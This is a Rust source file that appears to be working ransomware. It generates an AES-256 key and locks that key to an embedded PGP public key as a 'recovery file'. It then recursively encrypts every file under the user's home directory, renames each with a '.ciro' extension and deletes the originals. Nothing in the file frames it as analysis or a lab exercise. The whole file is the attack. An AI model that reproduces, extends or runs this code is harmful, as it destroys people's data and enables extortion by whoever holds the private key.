use aes_gcm::{
    aead::{Aead, OsRng},
    AeadCore, Aes256Gcm, KeyInit,
};
use dirs2::{data_dir, home_dir};
use pgp::{
    composed::{Deserializable, MessageBuilder, SignedPublicKey},
    crypto::sym::SymmetricKeyAlgorithm,
};
use rayon::prelude::*;
use std::{
    fs::{read, read_dir, remove_file, File},
    io::Write,
    path::PathBuf,
};
use zeroize::Zeroize;

const PUB_KEY_STR: &str = r#"
-----BEGIN PGP PUBLIC KEY BLOCK-----

mDMEaNRDHBYJKwYBBAHaRw8BAQdAM8+crM87HecyVWi/k+a+0Vlkp4fEnpEkk2xg
KcizQzy0LEZpbGlwcG8gQmFnbGlvbmkgPGZpbG9iYWdsaW9uaS4wNkBwcm90b24u
bWU+iJYEExYKAD4WIQQq8+jcfYc6/q12JSDkSWtWixgznQUCaNRDHAIbAwUJBaOa
gAULCQgHAgYVCgkICwIEFgIDAQIeAQIXgAAKCRDkSWtWixgznbMCAP4ug/jPqZ78
1iMctTSBYBF92TdmzorGCKlv+1InZg0zMwEA5/7F5/++YqUuIoVZb1eUvlrluc50
C1NT0TBzM1iN0AW4OARo1EMcEgorBgEEAZdVAQUBAQdA85zIyIKYuI1rRy9ozu1k
QdhcC6lqyCOUcWcsiMuAYCADAQgHiH4EGBYKACYWIQQq8+jcfYc6/q12JSDkSWtW
ixgznQUCaNRDHAIbDAUJBaOagAAKCRDkSWtWixgzna6bAP4yumlrKO/Xs1h3XLG8
UgUh300R5/gZlZUHlRNb04NypAD+N3v9KcO4uVzuKNJcjyYbwy3HX7vxR76F1Py0
JXRKgQk=
=Nkpc
-----END PGP PUBLIC KEY BLOCK-----
"#;

fn encrypt_file(file: PathBuf, cipher: Aes256Gcm) -> Result<(), std::io::Error> {
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
    let content: Vec<u8> = read(&file)?;
    let ciphertext: Vec<u8> = cipher
        .encrypt(&nonce, content.as_ref())
        .map_err(|_| std::io::Error::new(std::io::ErrorKind::Other, "Encryption error"))?;

    // A new file with the encrypted content is created and the old one deleted
    let mut new_path = file.clone();
    if let Some(ext) = new_path.extension() {
        new_path.set_extension(format!("{}.ciro", ext.to_string_lossy()));
    } else {
        new_path.set_extension("ciro");
    }
    let mut new_file = File::create(new_path)?;
    new_file.write_all(&nonce)?;
    new_file.write_all(&ciphertext)?;
    let _ = remove_file(file);
    Ok(())
}

fn encrypt_files(dir: PathBuf, cipher: Aes256Gcm) {
    if let Ok(entries) = read_dir(dir) {
        entries.par_bridge().into_par_iter().for_each(|entry| {
            if let Ok(entry) = entry {
                let path = entry.path();
                if path.is_dir() {
                    encrypt_files(path, cipher.clone());
                }
                else if let Some(ext) = path.extension() && ext != "txt.key"{
                    if let Some(err) = encrypt_file(path, cipher.clone()).err() {
                        println!("Error: {err}");
                    }
                } else if let Err(e) = encrypt_file(path, cipher.clone()) {
                    println!("Error: {e}");
                }
            }
        });
    }

}


// Main function of the program
fn main() {
    let dir = home_dir().expect("Could not open home directory");

    // Generate a cipher to encrypt files with aes2356 algorithm
    let mut key = Aes256Gcm::generate_key(OsRng);
    let cipher = Aes256Gcm::new(&key);

    // Create a recovery file inside data dir with the cipher key and nonce
    let (public_key, _) =
        SignedPublicKey::from_string(PUB_KEY_STR).expect("Could not read public key");

    let mut msg =
        MessageBuilder::from_bytes("", key.to_vec()).seipd_v1(OsRng, SymmetricKeyAlgorithm::AES256);

    msg.encrypt_to_key(OsRng, &public_key)
        .expect("recovery key encryption failure");

    let mut data_dir = data_dir().expect("Missing dara dir");
    data_dir.push("recovery_file");
    data_dir.set_extension("txt.key");
    let mut recovery_file = File::create(data_dir).expect("Failed to create recovery file");

    recovery_file
        .write_all(&msg.to_vec(OsRng).unwrap())
        .expect("recovery file written");

    encrypt_files(dir, cipher);

    // Zeroing the key in memory
    key.zeroize();
}
